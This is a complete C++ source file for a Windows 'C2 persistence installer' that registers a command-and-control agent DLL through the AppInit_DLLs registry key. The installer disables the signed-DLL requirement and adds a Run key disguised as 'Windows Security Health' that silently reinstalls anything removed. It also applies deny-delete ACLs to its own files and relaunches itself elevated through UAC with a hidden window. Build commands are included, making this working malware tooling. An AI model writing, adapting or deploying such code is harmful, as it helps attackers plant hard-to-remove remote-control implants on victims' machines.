/**
 * SAFE.cpp — C2 Persistence Installer
 *
 * Sets up AppInit_DLLs persistence so the C2 agent DLL loads automatically
 * into every GUI process on every boot, without requiring repeated user action.
 *
 * What it does
 * ────────────
 *  1. Copies itself  → %USERPROFILE%\SAFE.exe
 *  2. Copies the DLL → %USERPROFILE%\AppInit_DLLs.dll
 *     (looks for AppInit_DLLs.dll first, falls back to config.dll in same dir)
 *  3. Sets HKLM\...\Windows NT\...\Windows:
 *       AppInit_DLLs           = "C:%HOMEPATH%\AppInit_DLLs.dll"  (REG_EXPAND_SZ)
 *       LoadAppInit_DLLs       = 1                                 (REG_DWORD)
 *       RequireSignedAppInit_DLLs = 0                              (REG_DWORD)
 *  4. Sets HKCU\...\Run:
 *       "Windows Security Health" = "%USERPROFILE%\SAFE.exe /check"
 *       (secondary persistence — re-verifies on every login)
 *  5. ACL-protects both files:
 *       DENY  DELETE | WRITE_DAC | WRITE_OWNER → Everyone
 *       ALLOW GENERIC_ALL                       → SYSTEM
 *       ALLOW GENERIC_ALL                       → Administrators
 *       (regular users can't delete; admin sees a UAC/ownership prompt)
 *
 * Modes
 * ─────
 *  SAFE.exe          Full install. Auto-elevates via UAC if not admin.
 *  SAFE.exe /check   Silent self-heal (run from Run key). No UAC prompt.
 *  SAFE.exe /remove  Undo everything: remove registry, run key, ACLs.
 *
 * Build
 * ─────
 *  x86_64-w64-mingw32-g++ -o SAFE.exe SAFE.cpp \
 *      -ladvapi32 -lshell32 -lshlwapi \
 *      -static -std=c++17 -O2 -mwindows
 */

#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <shellapi.h>
#include <aclapi.h>
#include <shlobj.h>
#include <string>
#include <cstring>

// ── Constants ─────────────────────────────────────────────────────────────────

static constexpr const char* DLL_NAME    = "AppInit_DLLs.dll";
static constexpr const char* EXE_NAME    = "SAFE.exe";
static constexpr const char* APINIT_KEY  =
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
static constexpr const char* RUN_KEY     =
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static constexpr const char* RUN_VALUE   = "Windows Security Health";
static constexpr const char* MUTEX_NAME  = "Global\\__C2InstallerMtx__";

// ── Helpers ───────────────────────────────────────────────────────────────────

static std::string get_userprofile() {
    char buf[MAX_PATH]{};
    if (GetEnvironmentVariableA("USERPROFILE", buf, MAX_PATH))
        return buf;
    // Fallback
    ExpandEnvironmentStringsA("%HOMEDRIVE%%HOMEPATH%", buf, MAX_PATH);
    return buf;
}

static std::string get_self_path() {
    char buf[MAX_PATH]{};
    GetModuleFileNameA(nullptr, buf, MAX_PATH);
    return buf;
}

static std::string dir_of(const std::string& p) {
    size_t pos = p.rfind('\\');
    return pos != std::string::npos ? p.substr(0, pos) : p;
}

static bool file_exists(const std::string& p) {
    return GetFileAttributesA(p.c_str()) != INVALID_FILE_ATTRIBUTES;
}

static bool is_elevated() {
    BOOL elevated = FALSE;
    HANDLE token  = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION e{};
        DWORD sz = 0;
        if (GetTokenInformation(token, TokenElevation, &e, sizeof(e), &sz))
            elevated = e.TokenIsElevated;
        CloseHandle(token);
    }
    return elevated != FALSE;
}

// ── Registry helpers ──────────────────────────────────────────────────────────

static bool reg_set_dword(HKEY root, const char* sub, const char* name, DWORD val) {
    HKEY hk;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_DWORD,
                             (const BYTE*)&val, sizeof(val)) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

static bool reg_set_expand(HKEY root, const char* sub, const char* name, const char* val) {
    HKEY hk;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_EXPAND_SZ,
                             (const BYTE*)val,
                             (DWORD)strlen(val) + 1) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

static bool reg_set_sz(HKEY root, const char* sub, const char* name, const char* val) {
    HKEY hk;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_SZ,
                             (const BYTE*)val,
                             (DWORD)strlen(val) + 1) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

static void reg_delete_value(HKEY root, const char* sub, const char* name) {
    HKEY hk;
    if (RegOpenKeyExA(root, sub, 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueA(hk, name);
        RegCloseKey(hk);
    }
}

// ── File ACL protection ───────────────────────────────────────────────────────
//
// DACL structure:
//   [0] DENY  DELETE | WRITE_DAC | WRITE_OWNER  → Everyone
//   [1] ALLOW GENERIC_ALL                        → NT AUTHORITY\SYSTEM
//   [2] ALLOW GENERIC_ALL                        → BUILTIN\Administrators
//
// Result: any user who tries to delete the file gets "Access Denied".
// An administrator must first take ownership (requires entering password /
// confirming UAC), then reset the ACL before deleting.
static void protect_file(const std::string& path) {
    PSID pEveryone = nullptr, pAdmins = nullptr, pSystem = nullptr;
    SID_IDENTIFIER_AUTHORITY wAuth = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY nAuth = SECURITY_NT_AUTHORITY;

    AllocateAndInitializeSid(&wAuth, 1, SECURITY_WORLD_RID,
                             0,0,0,0,0,0,0, &pEveryone);
    AllocateAndInitializeSid(&nAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                             DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmins);
    AllocateAndInitializeSid(&nAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                             0,0,0,0,0,0,0, &pSystem);

    EXPLICIT_ACCESSA ea[3]{};

    ea[0].grfAccessPermissions = DELETE | WRITE_DAC | WRITE_OWNER;
    ea[0].grfAccessMode        = DENY_ACCESS;
    ea[0].grfInheritance       = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName    = (LPSTR)pEveryone;

    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode        = GRANT_ACCESS;
    ea[1].grfInheritance       = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType  = TRUSTEE_IS_USER;
    ea[1].Trustee.ptstrName    = (LPSTR)pSystem;

    ea[2].grfAccessPermissions = GENERIC_ALL;
    ea[2].grfAccessMode        = GRANT_ACCESS;
    ea[2].grfInheritance       = NO_INHERITANCE;
    ea[2].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea[2].Trustee.TrusteeType  = TRUSTEE_IS_GROUP;
    ea[2].Trustee.ptstrName    = (LPSTR)pAdmins;

    PACL pACL = nullptr;
    if (SetEntriesInAclA(3, ea, nullptr, &pACL) == ERROR_SUCCESS) {
        SetNamedSecurityInfoA(
            (LPSTR)path.c_str(), SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
            nullptr, nullptr, pACL, nullptr
        );
        LocalFree(pACL);
    }
    if (pEveryone) FreeSid(pEveryone);
    if (pAdmins)   FreeSid(pAdmins);
    if (pSystem)   FreeSid(pSystem);
}

// Strip the DENY ACE so the file can be deleted normally again
static void unprotect_file(const std::string& path) {
    PACL pDACL = nullptr;
    PSECURITY_DESCRIPTOR pSD = nullptr;
    // Read the existing DACL
    if (GetNamedSecurityInfoA((LPSTR)path.c_str(), SE_FILE_OBJECT,
                              DACL_SECURITY_INFORMATION,
                              nullptr, nullptr, &pDACL, nullptr, &pSD) == ERROR_SUCCESS) {
        // Replace with an empty (inherited) DACL — Windows fills it from parent
        SetNamedSecurityInfoA((LPSTR)path.c_str(), SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,  // clear PROTECTED flag
            nullptr, nullptr, nullptr, nullptr);
        LocalFree(pSD);
    }
}

// ── Install ───────────────────────────────────────────────────────────────────

static void do_install(bool check_only) {
    std::string up       = get_userprofile();
    std::string self     = get_self_path();
    std::string self_dir = dir_of(self);

    std::string dst_exe = up + "\\" + EXE_NAME;
    std::string dst_dll = up + "\\" + DLL_NAME;

    // ── 1. Copy files ─────────────────────────────────────────────────────────
    if (!check_only || !file_exists(dst_exe)) {
        if (self != dst_exe)
            CopyFileA(self.c_str(), dst_exe.c_str(), FALSE); // FALSE = overwrite
    }

    if (!check_only || !file_exists(dst_dll)) {
        // Prefer AppInit_DLLs.dll in the same directory; fallback to config.dll
        std::string src_dll = self_dir + "\\" + DLL_NAME;
        if (!file_exists(src_dll))
            src_dll = self_dir + "\\config.dll";
        if (file_exists(src_dll) && src_dll != dst_dll)
            CopyFileA(src_dll.c_str(), dst_dll.c_str(), FALSE);
    }

    // ── 2. Registry: AppInit_DLLs ─────────────────────────────────────────────
    //
    //  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
    //  ├── AppInit_DLLs              REG_EXPAND_SZ  C:%HOMEPATH%\AppInit_DLLs.dll
    //  ├── LoadAppInit_DLLs          REG_DWORD       1
    //  └── RequireSignedAppInit_DLLs REG_DWORD       0
    //
    reg_set_expand(HKEY_LOCAL_MACHINE, APINIT_KEY, "AppInit_DLLs",
                   ("C:%HOMEPATH%\\" + std::string(DLL_NAME)).c_str());
    reg_set_dword(HKEY_LOCAL_MACHINE, APINIT_KEY, "LoadAppInit_DLLs",           1);
    reg_set_dword(HKEY_LOCAL_MACHINE, APINIT_KEY, "RequireSignedAppInit_DLLs",  0);

    // ── 3. Run key (secondary persistence) ────────────────────────────────────
    // SAFE.exe /check runs silently on each login and self-heals anything
    // that was manually removed while the machine was shut down.
    reg_set_sz(HKEY_CURRENT_USER, RUN_KEY, RUN_VALUE,
               (dst_exe + " /check").c_str());

    // ── 4. Protect both files ─────────────────────────────────────────────────
    if (file_exists(dst_dll)) protect_file(dst_dll);
    if (file_exists(dst_exe)) protect_file(dst_exe);
}

// ── Remove (clean uninstall) ──────────────────────────────────────────────────

static void do_remove() {
    std::string up      = get_userprofile();
    std::string dst_exe = up + "\\" + EXE_NAME;
    std::string dst_dll = up + "\\" + DLL_NAME;

    // Strip protections before deleting
    if (file_exists(dst_dll)) { unprotect_file(dst_dll); DeleteFileA(dst_dll.c_str()); }
    if (file_exists(dst_exe)) { unprotect_file(dst_exe); /* don't delete self */ }

    // Remove registry
    reg_delete_value(HKEY_LOCAL_MACHINE, APINIT_KEY, "AppInit_DLLs");
    reg_delete_value(HKEY_LOCAL_MACHINE, APINIT_KEY, "LoadAppInit_DLLs");
    reg_delete_value(HKEY_LOCAL_MACHINE, APINIT_KEY, "RequireSignedAppInit_DLLs");
    reg_delete_value(HKEY_CURRENT_USER,  RUN_KEY,    RUN_VALUE);
}

// ── Entry point ───────────────────────────────────────────────────────────────

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    // Prevent duplicate simultaneous instances
    HANDLE mtx = CreateMutexA(nullptr, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (mtx) CloseHandle(mtx);
        return 0;
    }

    std::string cmd(lpCmdLine ? lpCmdLine : "");
    bool check_mode  = (cmd.find("/check")  != std::string::npos);
    bool remove_mode = (cmd.find("/remove") != std::string::npos);

    if (remove_mode) {
        // /remove: undo everything (doesn't need elevation for HKCU/files,
        // but needs elevation for HKLM registry keys)
        do_remove();
        CloseHandle(mtx);
        return 0;
    }

    // Full install or /check: both need admin for HKLM writes.
    // In /check mode (called from Run key) we skip UAC to avoid popups.
    if (!is_elevated() && !check_mode) {
        // Re-launch ourselves elevated via UAC
        char self[MAX_PATH]{};
        GetModuleFileNameA(nullptr, self, MAX_PATH);
        SHELLEXECUTEINFOA sei{};
        sei.cbSize       = sizeof(sei);
        sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb       = "runas";     // triggers UAC
        sei.lpFile       = self;
        sei.lpParameters = "";          // no extra args → full install mode
        sei.nShow        = SW_HIDE;
        ShellExecuteExA(&sei);
        if (sei.hProcess) CloseHandle(sei.hProcess);
        CloseHandle(mtx);
        return 0;
    }

    do_install(check_mode);
    CloseHandle(mtx);
    return 0;
}
